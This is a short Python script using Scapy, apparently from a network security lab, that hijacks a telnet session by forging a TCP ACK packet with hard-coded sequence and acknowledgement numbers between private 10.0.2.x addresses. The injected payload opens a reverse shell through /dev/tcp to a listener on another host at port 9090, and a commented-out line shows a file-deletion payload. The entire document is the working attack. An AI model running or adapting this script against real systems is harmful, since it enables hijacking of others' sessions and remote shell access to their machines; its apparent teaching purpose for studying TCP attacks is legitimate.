#!usr/bin/python3
from scapy.all import *
import sys

source_port = 32966
sequence = 1456791569
acknowldgement = 1402843092

print("Sending Session Hijacking Packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=source_port,dport=23,flags="A", seq=sequence,
	ack=acknowldgement)
# Data ="\rrm myfile.txt\r"
Data = "\r/bin/bash -i > /dev/tcp/10.0.2.7/9090 0<&1 2>&1\r"
pkt = IPLayer/TCPLayer/Data
pkt.show()
send(pkt,verbose=0)
